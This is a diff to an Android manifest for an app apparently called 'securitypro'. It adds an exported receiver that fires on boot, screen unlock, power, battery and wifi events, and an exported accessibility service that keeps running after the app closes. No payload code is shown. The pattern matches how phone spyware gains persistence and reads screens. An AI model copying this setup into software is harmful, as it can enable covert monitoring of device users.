@@ -40,7 +40,7 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/MyMaterialTheme">
-        <activity android:name="com.securitypro.proapp.Activity.MainActivity"></activity>
+        <activity android:name="com.securitypro.proapp.Activity.MainActivity"/>
         <activity android:name="com.securitypro.proapp.Activity.Splash"
             android:exported="true">
             <intent-filter>
@@ -101,8 +101,40 @@
             </intent-filter>
         </receiver>
 
+        <receiver
+            android:name=".Receiver.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.REBOOT" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+                <action android:name="android.intent.action.DATE_CHANGED" />
+                <action android:name="android.intent.action.BATTERY_CHANGED" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.net.wifi.NETWORK_STATE_CHANGED" />
+                <action android:name="Again" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
         <activity android:name="com.securitypro.proapp.Activity.RegisterKey"
             android:exported="true"/>
+
+        <service android:name=".Accessibility.Acc"
+            android:label="@string/service_name"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:stopWithTask="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice"
+                android:resource="@xml/accessibilityconfig" />
+        </service>
     </application>
 
 </manifest>
